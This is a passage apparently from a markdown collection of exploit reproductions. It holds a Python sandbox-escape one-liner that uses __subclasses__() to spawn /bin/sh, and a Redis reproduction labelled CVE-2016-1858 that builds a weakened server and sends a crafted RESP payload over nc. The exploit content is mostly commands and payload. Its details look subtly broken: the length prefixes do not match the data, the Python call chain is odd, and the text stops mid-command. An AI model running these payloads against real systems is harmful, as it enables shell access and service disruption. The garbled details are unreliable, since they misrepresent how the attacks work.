fn = lambda: None
# Test fn.__code__.co_code
fn.__code__.__class__.__base__.__subclasses__()[90]("/bin/sh",0)("/bin/sh",0)("\x00")
```

## CVE-2016-1858

*Requires:* [`Redis`](https://redis.io/), `Python` and `nc`.

```
$ git clone https://github.com/antirez/redis
$ cd redis
$ git checkout 88883adf2ebb2f1b2c2ea2a1c4c8b4d9b4a76e4e
$ vim src/server.h # Set the value of `REDIS_DEFAULT_REPL_BACKLOG_SIZE` to 1
$ make
$ src/redis-server

$ nc 127.0.0.1 6379
*1
$1
*3
$3
SET
$32
0000000000000000000000000000000000000000000000000000000000000001
$15
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ nc 127.0.0.1 6
